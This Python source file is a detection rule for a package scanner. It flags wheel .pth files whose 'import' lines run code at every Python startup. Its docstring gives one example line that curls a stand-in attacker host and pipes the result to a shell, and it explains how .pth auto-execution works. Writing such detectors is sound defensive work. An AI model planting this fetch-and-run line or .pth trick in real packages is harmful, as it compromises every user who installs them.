"""A .pth file that runs code every time Python starts.

Python reads every .pth file in site-packages at startup. Each line is normally a
path to add to sys.path, but a line starting with "import " (or "import\\t") is
executed as code, in every Python process, whether or not the package is ever
imported. So one line like

    import os; os.system("curl evil.example | sh")

runs on every startup. A few honest packages do this (setuptools' distutils
shim, coverage tools, editable installs), so:

- the executed lines call run-code, decoder, process or network names -> critical
- otherwise (they only import, or make harmless calls)                  -> medium

Only wheels count: a .pth file does nothing until it's installed into site-packages,
and only files installed to its top level are read there.
"""

from __future__ import annotations

from crotalus.models import AnalysisContext, Finding
from crotalus.rules.helpers.static_code_analysis import (
    DECODERS,
    RUN_CODE,
    calls,
    is_network,
    is_process,
    read,
)


def _installs_to_site_packages(path: str) -> bool:
    """Whether a wheel file lands at the top of site-packages, where .pth files run.

    That's the wheel's root, or the root of its .data/purelib or .data/platlib folder.
    """
    folders = path.split("/")
    if len(folders) == 1:
        return True
    return (
        len(folders) == 3
        and folders[0].endswith(".data")
        and folders[1] in ("purelib", "platlib")
    )


def _is_dangerous(call_name: str) -> bool:
    return (
        call_name in RUN_CODE
        or call_name in DECODERS
        or is_network(call_name)
        or is_process(call_name)
    )


def check(context: AnalysisContext) -> list[Finding]:
    if context.wheel is None:
        return []

    findings = []
    for path, text in context.wheel.pth_files.items(): #only wheel
        if not _installs_to_site_packages(path):
            continue
        # Exactly the lines Python's site module executes (it doesn't strip leading space).
        executed_lines = [
            line.rstrip()
            for line in text.splitlines()
            if line.startswith(("import ", "import\t"))
        ]
        if not executed_lines:
            continue  # only paths: harmless

        dangerous_calls: set[str] = set()
        for line in executed_lines:
            py_file = read(line)
            if py_file is None:
                continue  # would fail when Python runs it, so it does nothing
            for call_name, _ in calls(py_file):
                if call_name and _is_dangerous(call_name):
                    dangerous_calls.add(call_name)

        findings.append(
            Finding(
                rule_id="pth_import_running_code",
                severity="critical" if dangerous_calls else "medium",
                message=(
                    f"{path} runs code on every Python startup"
                    + (f", calling {', '.join(sorted(dangerous_calls))}" if dangerous_calls else "")
                ),
                evidence={
                    "archive": "wheel",
                    "file": path,
                    "lines": executed_lines,
                    "dangerous_calls": sorted(dangerous_calls),
                },
            )
        )
    return findings
